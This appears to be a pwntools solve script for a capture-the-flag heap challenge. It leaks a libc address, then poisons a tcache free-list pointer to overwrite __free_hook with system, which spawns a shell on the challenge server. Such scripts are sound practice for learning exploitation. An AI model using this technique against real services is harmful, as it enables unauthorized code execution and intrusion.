#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
#p = process()
p = remote('172.31.3.2', 4241)
def add(idx,size):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',f'{size}'.encode())

def delete(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',f'{idx}'.encode())
def edit(idx,size,data):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',f'{size}'.encode())
    p.sendafter(b'> ',data)

def show(idx):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'> ',f'{idx}'.encode())


add(0, 0x500)
add(1, 0x10)

delete(0)

add(2, 0x70)
add(3, 0x70)
add(4, 0x70)
show(2)

libc.address = u64(p.recvline()[:8]) - 0x1ed010
log.info(f'libc: {hex(libc.address)}')

input()
add(5, 0x380)
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

delete(4)
delete(3)

edit(2, 0x88, b'a' * 0x70 + p64(0) + p64(0x81) + p64(free_hook))  #change fd
add(5, 0x70)
add(6, 0x70)
edit(5, 8, b'/bin/sh\x00')
edit(6, 8, p64(system))
delete(5)
p.interactive()

